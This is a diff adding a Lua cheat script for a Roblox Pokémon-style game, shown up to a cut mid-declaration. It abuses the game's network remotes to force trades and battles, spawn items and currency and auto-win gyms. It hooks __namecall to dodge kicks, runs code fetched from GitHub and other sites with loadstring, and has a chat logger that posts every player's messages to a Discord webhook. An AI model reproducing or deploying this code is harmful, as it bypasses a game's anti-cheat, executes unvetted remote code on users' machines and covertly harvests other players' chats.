@@ -1,0 +1,1806 @@
+--[[
+                ██████████████████████                
+          ██████████████████████████████            
+      ████████████████████████████████████          
+        ████████████████████████████████████        
+          ██████▓▓██████████████▓▓▓▓▓▓██████              ⠀⠀⠀⠀⠀⠀⠀⠀        ⢀⡴⠞⢳⠀⠀
+        ████▓▓▓▓▒▒▓▓██████████████▓▓▒▒▓▓██████                           ⠀⡔⠋⠀⢰⠎⠀⠀⠀⠀⠀
+      ██████▓▓▒▒▓▓██████▓▓██████████▓▓▒▒▓▓██████      ⠀                  ⣼⢆⣤⡞⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ▓▓████▓▓▒▒▓▓▓▓████▓▓▓▓████████████▒▒▓▓██████    ⠀⠀                  ⣼⢆⣤⡞⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ████▓▓▒▒▓▓████████▓▓▓▓▓▓██████████▓▓▓▓▓▓██████  ⠀⠀⠀⠀               ⣼⢠⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ████▓▓▒▒▓▓████████▓▓▒▒▓▓████████████▓▓▓▓████    ⠀⠀⠀⠀⠀⠀⠀⢀⣀⣾⢳⠀⠀⠀⠀⢸⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ████▓▓▓▓▓▓████████▓▓▒▒▓▓██████████████▓▓████    ⠀ ⣀⡤⠴⠊⠉⠀⠀⠈⠳⡀⠀⠀⠘⢎⠢⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ██████▓▓████████████▓▓▒▒██████████████▓▓████       ⠳⣄⠀⠀⡠⡤⡀⠀⠘⣇⡀⠀⠀⠀⠉⠓⠒⠺⠭⢵⣦⡀⠀⠀⠀
+      ████▓▓████▒▒████████▓▓██████▒▒████████████   ⠀     ⢹⡆⠀⢷⡇⠁⠀⠀⣸⠇⠀⠀⠀⠀⠀⢠⢤⠀⠀⠘⢷⣆⡀⠀
+      ██████████  ██  ████████  ██  ██████████      ⠀    ⠘⠒⢤⡄⠖⢾⣭⣤⣄⠀⡔⢢⠀⡀⠎⣸⠀⠀⠀⠀⠹⣿⡀
+        ██████    ██▒▒  ████  ▒▒██    ████████      ⠀    ⢀⡤⠜⠃⠀⠀⠘⠛⣿⢸⠀⡼⢠⠃⣤⡟⠀⠀⠀⠀⠀⣿⡇
+      ▓▓██░░░░    ████    ██  ████    ░░████░░      ⠀    ⠸⠶⠖⢏⠀⠀⢀⡤⠤⠇⣴⠏⡾⢱⡏⠁⠀⠀⠀⠀⢠⣿⠃
+    ▓▓▓▓▓▓██▒▒░░                    ░░▒▒██░░  ░░   ⠀⠀⠀       ⠈⣇⡀⠿⠀⠀⠀⡽⣰⢶⡼⠇⠀⠀⠀⠀⣠⣿⠟⠀
+    ▓▓████▓▓██▒▒░░░░░░░░░░░░  ░░  ░░▒▒██░░░░░░░░    ⠀⠀⠀⠀⠀     ⠈⠳⢤⣀⡶⠤⣷⣅⡀⠀⠀⠀⣀⡠⢔⠕⠁⠀⠀
+      ▓▓████▓▓████▒▒▒▒░░░░░░░░▒▒▒▒████░░    ░░      ⠀⠀⠀⠀⠀        ⠈⠙⠫⠿⠿⠿⠛⠋⠁⠀⠀⠀⠀
+        ▓▓██▓▓████████  ████  ████████░░  ░░        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣶⣶⣶⣤⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+          ▓▓▓▓██████████    ██████████░░░░                   ⠀⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀
+            ▓▓▒▒  ████▒▒████▒▒████  ▒▒██░░                  ⣰⣿⣿⣿⣿⣿⣿⡿⠟⠉⠙⣿⣿⣿⣿⣿⣿⣿⡟⢿⣿⣆⠀⠀⠀⠀
+          ▓▓████▒▒████▒▒████▒▒████▒▒██████░░               ⣼⣿⣿⣿⣿⣿⣿⣿⣷⣄⣀⣤⣾⣿⡿⠋⠉⠉⠉⠑⠨⣿⣿⣷⡀⠀⠀
+        ██  ██▓▓▒▒████▒▒████▒▒████▒▒████  ██        ⠀    ⢠⢹⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⣠⡶⢤⡀⠀⠻⣿⣿⡄⠀
+      ████▒▒  ▒▒██████▒▒████▒▒██████▒▒  ▒▒████          ⠀⣾⠋⣸⣿⣿⡿⣿⣄⣸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⢹⣧⣴⠇⠀⠀⢻⣿⣧⠀
+      ██  ██▒▒████████▒▒████▒▒████████▒▒██  ██          ⢰⣿⣿⣿⣿⡟⠀⠈⠉⠛⠻⢿⣿⣿⣿⣿⠀⠀⠀⠀⣿⠉⢻⡧⠀⠀⢸⣿⣿⠀
+        ██  ██████████▒▒    ▒▒██████████  ██             ⢸⡿⣿⣿⣿⣷⡄⠀⠀⠀⠀⢨⣿⣿⣿⣿⣧⠀⠀⠀⠙⠷⠾⠃⠀⠀⣼⣿⣿⠂
+          ████████████▒▒░░░░▒▒████████████              ⠸⠇⠉⢻⣿⣿⣷⣤⡀⠀⠀⣸⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⣀⣼⣿⣿⡟⠀
+            ▒▒    ████▒▒████▒▒████    ▒▒            ⠀⠀   ⠀⠀⠘⠛ ⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣿⣿⣿⣿⣿⠇⠀
+            ██▒▒▒▒  ▒▒▒▒████▒▒▒▒  ▒▒▒▒██            ⠀⠀  ⠀⠀⠀  ⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀
+              ████▒▒▒▒▒▒████▒▒▒▒▒▒██▓▓              ⠀⠀⠀  ⠀  ⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀
+                ████████    ████████                ⠀         ⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⠀⠀⠀⠀
+                  ████        ████                             ⠀⠶⣤⣭⣭⣉⣉⣉⣛⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀
+                  ⠀                                                ⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀                                                   
+⠀⠀⠀⠀⠀⠀                                                  
+  ⠀⠀
+--]]
+
+local plr = game:GetService("Players").LocalPlayer
+local cclosure = syn_newcclosure or newcclosure or nil
+if not cclosure or not hookmetamethod then
+    plr:Kick("\nUnsupported Exploit")
+end
+local localPlayer = game:GetService("Players").LocalPlayer
+local item1 = "pokeball"
+local qy = 1
+local _p = nil
+for _, v in pairs(getgc(true)) do
+    if typeof(v) == "table" then
+        if rawget(v, "PlayerData") then
+            _p = v
+            break
+        end
+    end
+end
+
+local forcebattle = function(player)
+    _p.Network:post("BattleRequest",player,{accepted = true})
+end;
+
+local forcetrade = function(player)
+    _p.Network:post("TradeRequest",player,{accepted = true})
+end;
+
+local chunkrev = function(obj)
+    spawn(function()
+            _p.Network:get("DataRequest",{"ChunkReceived",obj})
+    end)
+end;
+
+local autowin = function(splayer)
+    local battle = _p.Battle.currentBattle
+    battle:send("forfeit", splayer)
+end;
+
+local spawnitem = function(itemid, q)
+    for i = 1, q do
+        _p.Network:get("PDS", "giveItem", itemid, 1, true)
+        _p.Network:get("PDS", "takeItem", 1)
+    end
+end;
+
+local spawntix = function(q)
+    _p.Network:get("PDS", "AlolanReward", q / 2)
+end;
+
+local changetitle = function(text, color)
+    _p.Network:post("UpdateTitle","Winner" .. text .. "Winner", color)
+end;
+
+local spoofbattlejoin = function(splayer)
+    _p.Battle.currentBattle:send("forfeit","join",splayer,"spoofed",{1})
+end;
+
+local beatgym = function(gym)
+    local index = {109, 112, 113, 98, 126, 147,154, 173}
+    local battle =
+    _p.Network:get("BattleFunction","new",{["expShare"] = false,["battleType"] = 1,["nnalp"] = false,["isDay"] = true,["chunkId"] = "chunk1",["regionId"] = "Route 1",["trainerId"] = index[gym] or 1})
+    _p.Network:post("BattleEvent", battle.battleId, "join", 1, ";)")
+    wait(1)
+    _p.Network:post("BattleEvent", battle.battleId, "forfeit", "p2")
+    _p.Network:post("BattleEvent", battle.battleId, "destroy")
+end
+
+local oldNamecall
+oldNamecall = hookmetamethod(game, "__namecall", cclosure(function(self,...)
+   local NamecallMethod = getnamecallmethod()
+   local args = {...}
+   
+   if (NamecallMethod == "Kick" or NamecallMethod == "kick") and not checkcaller() then
+       if self ~= plr then
+           return oldNamecall(self,...)
+       end
+       return
+   end
+   
+   return oldNamecall(self,...)
+end))
+
+game:GetService("ScriptContext"):SetTimeout(0.1)
+local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/bigbootylatinas/8-Ball/main/main"))()
+if syn and syn.protect_gui then
+    syn.protect_gui(game:GetService("CoreGui"))
+    syn.protect_gui(game:GetService("StarterGui"))
+end
+wait(.4)
+
+local text
+
+local GUI =
+    Mercury:Create {
+    Name = "🎱  Dev Testing",
+    Size = UDim2.fromOffset(580, 370),
+    Theme = Mercury.Themes.Ball,
+    Link = "https://8m.cc"
+    
+}
+
+local Tab =
+    GUI:Tab {
+    Name = "Main",
+    Icon = "rbxassetid://12315840678"
+}
+
+local section = Tab:section{
+    Name = "Main" -- default
+  }
+
+  
+  section:Textbox {
+      Name = "Type Webhook 🆔",
+      Callback = function(str)
+          text = str
+      end
+  }
+
+  section:Button {
+    Name = "Heal 💟",
+    Description = nil,
+    Callback = function()
+        GUI:Notification
+        {
+            Title = "Notification",
+            Text = "Your pokemon has been healed.",
+            Duration = 6,
+        }
+        _p.Network:get("PDS", "getPartyPokeBalls")
+        
+    end
+}
+
+section:Button {
+    Name = "save 💾",
+    Description = nil,
+    Callback = function()
+        GUI:Notification
+        {
+            Title = "Notification",
+            Text = "Your data has been saved 💾.",
+            Duration = 6,
+        }
+    _p.PlayerData:save()
+    
+    syn.secure_call(_p.saveGame)
+    _p.Menu:enable()
+    _p.MasterControl.WalkEnabled = true
+    end
+}
+
+section:Button {
+    Name = "Open Map 🗺️",
+    Description = nil,
+    Callback = function()
+        _p.Menu.Map:fly()
+        _p.Menu:enable()
+        _p.MasterControl.WalkEnabled = true
+    end
+}
+section:Button {
+    Name = "Unstuck 🔓",
+    Description = nil,
+    Callback = function()
+        GUI:Notification
+        {
+            Title = "Notification",
+            Text = "You're now unstuck.",
+            Duration = 6,
+        }
+
+        _p.Menu.options:getUnstuck(true)
+        _p.Menu:enable()
+        _p.MasterControl.WalkEnabled = true
+    end
+}
+section:Toggle {
+    Name = "Toggle Repel 🏃🐶",
+    StartingState = false,
+    Description = nil,
+    Callback = function(value)
+        if value then
+            GUI:Notification
+        {
+            Title = "Notification",
+            Text = "Repel is enabled.",
+            Duration = 6,
+        }
+            
+            _p.Repel.steps = 1000000
+            
+        else
+            GUI:Notification
+        {
+            Title = "Notification",
+            Text = "Repel is disabled.",
+            Duration = 6,
+        }
+            _p.Repel.steps = 0
+        end
+        Enabled = false
+    end
+}
+
+local section = Tab:section{
+    Name = "Pokemon" -- default
+  }
+
+section:Button {
+    Name = "Open Party List 🐶",
+    Description = nil,
+    Callback = function()
+        syn.secure_call(_p.Menu.party.open, localPlayer.PlayerScripts.ChatScript, _p.Menu.party)
+    end
+}
+
+section:Button {
+    Name = "Open PC 🖥️",
+    Description = nil,
+    Callback = function()
+        syn.secure_call(_p.Menu.pc.bootUp, localPlayer.PlayerScripts.ChatScript, _p.Menu.pc)
+        _p.Menu:enable()
+        _p.MasterControl.WalkEnabled = true
+    end
+}
+
+local section = Tab:section{
+    Name = "Skip" -- default
+  }
+
+  section:Button {
+    Name = "Beat All Gyms 🥇",
+    Description = nil,
+    Callback = function()
+        GUI:Notification
+        {
+            Title = "Notification",
+            Text = "Gyms beaten.",
+            Duration = 6,
+        }
+        for i = 1, 8 do
+            beatgym(i)
+        end
+    end
+}
+
+section:Button {
+    Name = "Fast Text [ON] ⏭️",
+    Description = nil,
+    Callback = function()
+        _p.Menu.options.FastText = true
+    end
+}
+
+section:Button {
+    Name = "Skip Chat (Slightly Bugged) ⏭️",
+    Description = nil,
+    Callback = function()
+        local SkipChat = true
+        local OldWait
+        OldWait =
+            hookfunction(
+            _p.NPCChat.AdvanceSignal:wait(),
+            function(...)
+                if SkipChat then
+                    return
+                end
+                OldWait(...)
+            end
+        )
+        local Old
+        Old = hookfunction(
+            _p.NPCChat:say(),
+            function(...)
+                local Args = {...}
+                if SkipChat then
+                    for i = 3, #Args do
+                        if typeof(Args[i]) == "string" then
+                            Args[i] = "."
+                        end
+                    end
+                end
+                return Old(unpack(Args))
+        end)
+    end
+}
+local section = Tab:section{
+    Name = "Hoverboard" -- default
+  }
+section:dropdown(
+    {
+        Name = "Set Hoverboard 🛹",
+        StartingText = "Hoverboard..",
+        Items = {
+            {"Red", "Basic Red"},
+            {"Yellow", "Basic Yellow"},
+            {"Pink", "Basic Pink"},
+            {"Green", "Basic Green"},
+            {"White", "Basic White"},
+            {"Gray", "Basic Grey"},
+            {"Black", "Basic Black"},
+            {"Blue", "Basic Blue"}
+        },
+        Description = "Sets your hoverboard to a specific color!",
+        Callback = function(selectedOption)
+            _p.Network:get("PDS", "setHoverboard", selectedOption)
+        end
+    }
+)
+
+section:dropdown(
+    {
+        Name = "Set Paid Bord 🛹",
+        StartingText = "Hoverboard..",
+        Items = {
+            {"Banana", "Banana"},
+            {"Rotom", "Rotom"}
+        },
+        Description = "Sets your hoverboard to a specific color!",
+        Callback = function(selectedOption)
+            _p.Network:get("PDS", "setHoverboard", selectedOption)
+        end
+    }
+)
+
+--[[
+    BREEDING
+]]
+local Tab =
+    GUI:Tab {
+    Name = "Breeding",
+    Icon = "rbxassetid://12316099051"
+}
+
+Tab:Button {
+    Name = "Open PC 🖥️",
+    Description = nil,
+    Callback = function()
+        syn.secure_call(_p.Menu.pc.bootUp, localPlayer.PlayerScripts.ChatScript, _p.Menu.pc)
+    end
+}
+
+local section = Tab:section{
+    Name = "Daycare Man" -- default
+  }
+
+section:Button {
+    Name = "Bring Daycare Man 👴",
+    Description = nil,
+    Callback = function()
+        local lp = game:service "Players".LocalPlayer
+        game:GetService("Workspace").chunk9["DayCareMan"]:MoveTo(lp.Character.LeftHand.Position)
+        local Object = game.ReplicatedStorage.DayCare:WaitForChild("DayCareLady")
+        local CloneObject = Object:Clone()
+        CloneObject.Parent = game.Workspace.chunk9
+        game:GetService("Workspace").chunk9["DayCareLady"]:MoveTo(lp.Character.LeftHand.Position)
+    end
+}
+
+section:Button {
+    Name = "take egg 🥚",
+    Description = nil,
+    Callback = function()
+        GUI:Notification
+        {
+            Title = "Notification",
+            Text = "Daycare egg taken.",
+            Duration = 6,
+        }
+    _p.PlayerData:takeEgg()
+    
+    _p.Menu:enable()
+    _p.MasterControl.WalkEnabled = true
+    end
+}
+
+local section = Tab:section{
+    Name = "Daycare Lady" -- default
+  }
+  
+  section:dropdown(
+    {
+        Name = "Leave Pokemon at Daycare 👵",
+        StartingText = "Party Slot",
+        Items = {
+            {"Slot 1", 1},
+            {"Slot 2", 2},
+            {"Slot 3", 3},
+            {"Slot 4", 4},
+            {"Slot 5", 5},
+            {"Slot 6", 6}
+        },
+        Description = "This leaves your selected pokemon in the daycare",
+        Callback = function(v)
+            GUI:Notification
+        {
+            Title = "Notification",
+            Text = "Selected Pokemon was left at the daycare.",
+            Duration = 6,
+        }
+
+        _p.Network:get("PDS", "leaveDCPokemon", v)
+        end
+    }
+)
+
+section:Button {
+    Name = "Take Daycare Pokemon 👶",
+    Description = nil,
+    Callback = function()
+        _p.Network:get("PDS", "takeDCPokemon", 1)
+        wait(1)
+        _p.Network:get("PDS", "takeDCPokemon", 1)
+    end
+}
+
+local section = Tab:section{
+    Name = "Hatching" -- default
+  }
+
+section:Button {
+    Name = "Hoverboard Spin ['M' - Toggle] 🥚",
+    Description = nil,
+    Callback = function()
+        local uis = game:GetService("UserInputService")
+        local vim = game:GetService("VirtualInputManager")
+        local bind = Enum.KeyCode.M
+        uis.InputBegan:connect(
+            function(key)
+                if key.KeyCode == bind then
+                    vim:SendKeyEvent(true, "W", false, nil)
+                    vim:SendKeyEvent(true, "A", false, nil)
+                end
+            end
+        )
+    end
+}
+
+--[[
+    MISC
+]]
+local Tab =
+    GUI:Tab {
+    Name = "Misc",
+    Icon = "rbxassetid://12316043440"
+}
+
+local section = Tab:section{
+    Name = "FPS" -- default
+  }
+
+  section:Button {
+    Name = "Material Remover 🙅‍♂️🏗️",
+    Description = nil,
+    Callback = function()
+        _G.Settings = {
+            Players = {
+                ["Ignore Me"] = true, -- Ignore your Character
+                ["Ignore Others"] = true -- Ignore other Characters
+            },
+            Meshes = {
+                Destroy = false, -- Destroy Meshes
+                LowDetail = true -- Low detail meshes (NOT SURE IT DOES ANYTHING)
+            },
+            Images = {
+                Invisible = true, -- Invisible Images
+                LowDetail = false, -- Low detail images (NOT SURE IT DOES ANYTHING)
+                Destroy = false -- Destroy Images
+            },
+            Other = {
+                ["No Particles"] = true, -- Disables all ParticleEmitter, Trail, Smoke, Fire and Sparkles
+                ["No Camera Effects"] = true, -- Disables all PostEffect's (Camera/Lighting Effects)
+                ["No Explosions"] = true, -- Makes Explosion's invisible
+                ["No Clothes"] = true, -- Removes Clothing from the game
+                ["Low Water Graphics"] = true, -- Removes Water Quality
+                ["No Shadows"] = true, -- Remove Shadows
+                ["Low Rendering"] = true, -- Lower Rendering
+                ["Low Quality Parts"] = true -- Lower quality parts
+            }
+        }
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))(
+
+        )
+    end
+}
+
+local section = Tab:section{
+    Name = "Chat" -- default
+  }
+
+  section:Textbox {
+    Name = "Chat Logger 💬 (insert discord webhook)",
+    Callback = function(value)
+        local marketplaceService = game:GetService("MarketplaceService")
+
+        local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
+        if isSuccessful then
+            local wh = value
+            local embed1 = {
+                ["title"] = "Beginning of Message logs on " ..
+                    info.Name .. " at " .. tostring(os.date("%m/%d/%y at time %X"))
+            }
+            local a =
+                syn.request(
+                {
+                    Url = wh,
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {embed1}, ["content"] = ""}),
+                    Method = "POST"
+                }
+            )
+            function logMsg(Webhook, Player, Message)
+                local embed = {
+                    ["description"] = Player .. ": " .. Message .. "  " .. tostring(os.date("| time %X"))
+                }
+                local a =
+                    syn.request(
+                    {
+                        Url = Webhook,
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {embed}, ["content"] = ""}),
+                        Method = "POST"
+                    }
+                )
+            end
+            for i, v in pairs(game.Players:GetPlayers()) do
+                v.Chatted:Connect(
+                    function(msg)
+                        logMsg(wh, v.Name, msg)
+                    end
+                )
+            end
+
+            game.Players.PlayerAdded:Connect(
+                function(plr)
+                    plr.Chatted:Connect(
+                        function(msg)
+                            logMsg(wh, plr.Name, msg)
+                        end
+                    )
+                end
+            )
+        end
+    end
+}
+
+section:Button {
+    Name = "Chat Translator 💬🌐",
+    Description = nil,
+    Callback = function()
+        loadstring(game:HttpGetAsync("https://i.qts.life/r/ChatInlineTranslator.lua", true))()
+    end
+}
+
+local section = Tab:section{
+    Name = "Movement" -- default
+  }
+
+  section:Button {
+    Name = "Ctrl + TP 🌀",
+    Description = nil,
+    Callback = function()
+        local Plr = game:GetService("Players").LocalPlayer
+        local Mouse = Plr:GetMouse()
+        Mouse.Button1Down:connect(
+            function()
+                if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl) then
+                    return
+                end
+                if not Mouse.Target then
+                    return
+                end
+                Plr.Character:MoveTo(Mouse.Hit.p)
+            end
+        )
+    end
+}
+
+section:Button {
+    Name = "Noclip + Fly 🚀 [Toggle - E]",
+    Description = nil,
+    Callback = function()
+-- Fly Script
+--[[
+Toggle : LeftAlt (Editable in script)
+Fast Fly : LeftControl (Editable in script)
+Movement : W A S D (Editable in script)
+Up / Down : E / Q (Editable in script)
+--]]
+
+
+local Settings = {
+	
+	Speed = 5,
+	SprintSpeed = 30,
+	ToggleKey = Enum.KeyCode.E,
+	SprintKey = Enum.KeyCode.LeftControl,
+	
+	ForwardKey = Enum.KeyCode.W,
+	LeftKey = Enum.KeyCode.A,
+	BackwardKey = Enum.KeyCode.S,
+	RightKey = Enum.KeyCode.D,
+	--UpKey = Enum.KeyCode.E,
+	--DownKey = Enum.KeyCode.Q,
+	
+}
+
+local Screen = Instance.new("ScreenGui",game.CoreGui)
+local Distance = Instance.new("TextLabel",Screen)
+Distance.BackgroundTransparency = 1
+Distance.Size = UDim2.new(0,10,0,10)
+Distance.ZIndex = 2
+Distance.Text = "0"
+Distance.TextStrokeTransparency = .5
+Distance.TextSize = 20
+Distance.TextStrokeColor3 = Color3.fromRGB(33, 33, 33)
+Distance.Font = Enum.Font.Gotham
+Distance.TextColor3 = Color3.new(1,1,1)
+Distance.TextXAlignment = Enum.TextXAlignment.Left
+Distance.TextYAlignment = Enum.TextYAlignment.Top
+
+
+local Mouse = game.Players.LocalPlayer:GetMouse()
+local Direction = Vector3.new(0,0,0)
+local InterpolatedDir = Direction
+local Tilt = 0
+local InterpolatedTilt = Tilt
+local RunService = game:GetService("RunService")
+local Toggled = false
+local Sprinting = false
+local CameraPos = game.Workspace.CurrentCamera.CFrame.Position
+
+pcall(function()
+	game.Players.LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam	
+end)
+
+function Lerp(a, b, t)
+    return a + (b - a) * t
+end
+
+local LastPos = nil
+
+function KeyHandler(actionName, userInputState)
+	if true and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+		if actionName == "Toggle" and userInputState == Enum.UserInputState.Begin then
+			Toggled = not Toggled
+			if Toggled then
+				LastPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+				--game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+				game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true 
+			else
+				LastPos = nil
+				game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
+				--game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+			end
+		elseif actionName == "Forward" then
+			Tilt = userInputState == Enum.UserInputState.Begin and -20 or 0
+			Direction = Vector3.new(Direction.x,Direction.y,userInputState == Enum.UserInputState.Begin and -1 or 0)
+		elseif actionName == "Left" then
+			Direction = Vector3.new(userInputState == Enum.UserInputState.Begin and -1 or 0,Direction.y,Direction.z)
+		elseif actionName == "Backward" then
+			Tilt = userInputState == Enum.UserInputState.Begin and 20 or 0
+			Direction = Vector3.new(Direction.x,Direction.y,userInputState == Enum.UserInputState.Begin and 1 or 0)
+		elseif actionName == "Right" then
+			Direction = Vector3.new(userInputState == Enum.UserInputState.Begin and 1 or 0,Direction.y,Direction.z)
+		elseif actionName == "Up" then
+			Direction = Vector3.new(Direction.x,userInputState == Enum.UserInputState.Begin and 1 or 0,Direction.z)
+		elseif actionName == "Down" then
+			Direction = Vector3.new(Direction.x,userInputState == Enum.UserInputState.Begin and -1 or 0,Direction.z)
+		elseif actionName == "Sprint" then
+			Sprinting = userInputState == Enum.UserInputState.Begin
+		end
+	end
+end
+
+
+
+game:GetService("UserInputService").InputBegan:connect(function(inputObject, gameProcessedEvent)
+	
+	if inputObject.KeyCode == Settings.ToggleKey then
+		KeyHandler("Toggle", Enum.UserInputState.Begin, inputObject)
+	elseif inputObject.KeyCode == Settings.ForwardKey then
+		KeyHandler("Forward", Enum.UserInputState.Begin, inputObject)
+	elseif inputObject.KeyCode == Settings.LeftKey then
+		KeyHandler("Left", Enum.UserInputState.Begin, inputObject)
+	elseif inputObject.KeyCode == Settings.BackwardKey then
+		KeyHandler("Backward", Enum.UserInputState.Begin, inputObject)
+	elseif inputObject.KeyCode == Settings.RightKey then
+		KeyHandler("Right", Enum.UserInputState.Begin, inputObject)
+	elseif inputObject.KeyCode == Settings.UpKey then	
+		KeyHandler("Up", Enum.UserInputState.Begin, inputObject)
+	elseif inputObject.KeyCode == Settings.DownKey then
+		KeyHandler("Down", Enum.UserInputState.Begin, inputObject)
+	elseif inputObject.KeyCode == Settings.SprintKey then
+		KeyHandler("Sprint", Enum.UserInputState.Begin, inputObject)
+	end
+	
+	
+end)
+
+
+game:GetService("UserInputService").InputEnded:connect(function(inputObject, gameProcessedEvent)
+	
+	if inputObject.KeyCode == Settings.ToggleKey then
+		KeyHandler("Toggle", Enum.UserInputState.End, inputObject)
+	elseif inputObject.KeyCode == Settings.ForwardKey then
+		KeyHandler("Forward", Enum.UserInputState.End, inputObject)
+	elseif inputObject.KeyCode == Settings.LeftKey then
+		KeyHandler("Left", Enum.UserInputState.End, inputObject)
+	elseif inputObject.KeyCode == Settings.BackwardKey then
+		KeyHandler("Backward", Enum.UserInputState.End, inputObject)
+	elseif inputObject.KeyCode == Settings.RightKey then
+		KeyHandler("Right", Enum.UserInputState.End, inputObject)
+	elseif inputObject.KeyCode == Settings.UpKey then	
+		KeyHandler("Up", Enum.UserInputState.End, inputObject)
+	elseif inputObject.KeyCode == Settings.DownKey then
+		KeyHandler("Down", Enum.UserInputState.End, inputObject)
+	elseif inputObject.KeyCode == Settings.SprintKey then
+		KeyHandler("Sprint", Enum.UserInputState.End, inputObject)
+	end
+	
+	
+end)
+
+
+RunService.RenderStepped:Connect(function()
+	if Toggled and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")  then
+		for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+			if v:IsA("BasePart") then
+				v.Velocity = Vector3.new(0,0,0)
+			end
+		end
+		local RootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
+		if LastPos then
+			Distance.Text = math.floor((LastPos-RootPart.Position).Magnitude+.5)
+			if (LastPos-RootPart.Position).Magnitude >= 350 then
+				Distance.TextColor3 = Color3.new(1,0,0)
+			else
+				Distance.TextColor3 = Color3.new(1,1,1)	
+			end
+		else
+			Distance.TextColor3 = Color3.new(1,1,1)
+			Distance.Text = 0
+		end
+		InterpolatedDir = InterpolatedDir:Lerp((Direction * (Sprinting and Settings.SprintSpeed or Settings.Speed)),.2)
+		InterpolatedTilt = Lerp(InterpolatedTilt ,Tilt* (Sprinting and 2 or 1),Tilt == 0 and .2 or .1)
+		RootPart.CFrame = RootPart.CFrame:Lerp(CFrame.new(RootPart.Position,RootPart.Position + Mouse.UnitRay.Direction) * CFrame.Angles(0,math.rad(00),0) * CFrame.new(InterpolatedDir)  * CFrame.Angles(math.rad(InterpolatedTilt),0,0),.2)
+	else
+		Distance.TextColor3 = Color3.new(1,1,1)
+		Distance.Text = 0
+	end	
+end)
+
+    end
+}
+
+
+local section = Tab:section{
+    Name = "Servers" -- default
+  }
+  section:Button {
+    Name = "Rejoin 🔗🔄",
+    Description = nil,
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Rejoin-Game/main/Rejoin%20Game.lua"))()
+    end
+}
+section:Button {
+    Name = "Server Browser 🖥️🗃️",
+    Description = nil,
+    Callback = function()
+        loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))()
+    end
+}
+--[[
+    SHOPS
+]]
+local Tab =
+    GUI:Tab {
+    Name = "Shops",
+    Icon = "rbxassetid://12315878682"
+}
+
+local section = Tab:section{
+    Name = "Stores" -- default
+  }
+
+  section:Button {
+    Name = "Pokemart 🏪",
+    Description = nil,
+    Callback = function()
+        local _p = nil
+        for _, v in pairs(getgc(true)) do
+            if typeof(v) == "table" then
+                if rawget(v, "PlayerData") then
+                    _p = v
+                    break
+                end
+            end
+        end
+        _p.Menu.shop:open()
+        _p.Menu:enable()
+        _p.MasterControl.WalkEnabled = true
+    end
+}
+section:Button {
+    Name = "BP Shop 🏬",
+    Description = nil,
+    Callback = function()
+        local _p = nil
+        for _, v in pairs(getgc(true)) do
+            if typeof(v) == "table" then
+                if rawget(v, "PlayerData") then
+                    _p = v
+                    break
+                end
+            end
+        end
+        _p.Menu.battleShop:open()
+        _p.Menu:enable()
+        _p.MasterControl.WalkEnabled = true
+    end
+}
+section:Button {
+    Name = "Stoneshop 💎",
+    Description = nil,
+    Callback = function()
+        local _p = nil
+        for _, v in pairs(getgc(true)) do
+            if typeof(v) == "table" then
+                if rawget(v, "PlayerData") then
+                    _p = v
+                    break
+                end
+            end
+        end
+        _p.Menu.shop:open("stnshp")
+        _p.Menu:enable()
+        _p.MasterControl.WalkEnabled = true
+    end
+}
+
+section:Button {
+    Name = "Arcade Shop 🎫",
+    Description = nil,
+    Callback = function()
+        local _p = nil
+        for _, v in pairs(getgc(true)) do
+            if typeof(v) == "table" then
+                if rawget(v, "PlayerData") then
+                    _p = v
+                    break
+                end
+            end
+        end
+        _p.Menu.ArcadeShop:open()
+        _p.Menu:enable()
+            _p.MasterControl.WalkEnabled = true
+    end
+}
+
+section:Button {
